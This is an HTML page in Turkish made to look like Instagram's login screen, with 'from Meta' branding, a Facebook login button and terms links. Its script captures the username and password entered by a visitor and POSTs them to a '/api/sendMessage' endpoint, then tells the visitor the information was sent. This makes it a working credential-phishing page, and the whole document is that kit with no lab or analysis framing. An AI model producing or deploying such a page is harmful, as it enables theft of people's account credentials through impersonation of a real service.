<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Giriş</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .logo {
            font-size: 48px;
            font-family: 'Brush Script MT', cursive;
            margin-bottom: 20px;
        }
        .btn-facebook {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #1877f2;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            width: 100%;
            margin-bottom: 20px;
            cursor: pointer;
        }
        .btn-facebook img {
            margin-right: 10px;
            height: 16px;
        }
        .btn-facebook:hover {
            background-color: #155db8;
        }
        .divider {
            display: flex;
            align-items: center;
            color: #aaa;
            font-size: 12px;
            margin: 10px 0;
        }
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #444;
        }
        .divider::before {
            margin-right: 10px;
        }
        .divider::after {
            margin-left: 10px;
        }
        .form-group {
            margin-bottom: 10px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: #fff;
            box-sizing: border-box;
        }
        .form-group input:focus {
            outline: none;
            border-color: #555;
        }
        .forgot-password {
            text-align: right;
            margin: 10px 0;
            color: #3897f0;
            text-decoration: none;
            font-size: 12px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .btn-login {
            background-color: #3897f0;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            width: 100%;
            cursor: pointer;
        }
        .btn-login:hover {
            background-color: #3185d6;
        }
        .signup {
            margin-top: 15px;
            color: #aaa;
            font-size: 14px;
        }
        .signup a {
            color: #3897f0;
            text-decoration: none;
        }
        .signup a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
        .footer a {
            color: #3897f0;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .meta-logo {
            margin-top: 20px;
            color: #555;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <button class="btn-facebook">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
            Facebook ile Devam Et
        </button>
        <div class="divider">YA DA</div>
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Şifre" required>
            </div>
            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
            <button type="submit" class="btn-login">Giriş Yap</button>
        </form>
        <div class="signup">
            Hesabın yok mu? <a href="#">Kaydol</a>
        </div>
        <div class="footer">
            Devam ederek, Instagram'ın <a href="#">Kullanım Koşulları</a> ve <a href="#">Gizlilik İlkesi</a>'ni kabul etmiş olursun.
        </div>
        <div class="meta-logo">from <strong>Meta</strong></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username && password) {
                try {
                    const response = await fetch('/api/sendMessage', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ username, password }),
                    });

                    const result = await response.json();

                    if (response.ok) {
                        alert("Bilgiler gönderildi!");
                    } else {
                        alert(`Gönderim başarısız oldu: ${result.error}`);
                    }
                } catch (error) {
                    console.error(error);
                    alert("Bir hata oluştu.");
                }
            } else {
                alert("Lütfen tüm alanları doldurun.");
            }
        });
    </script>
</body>
</html>
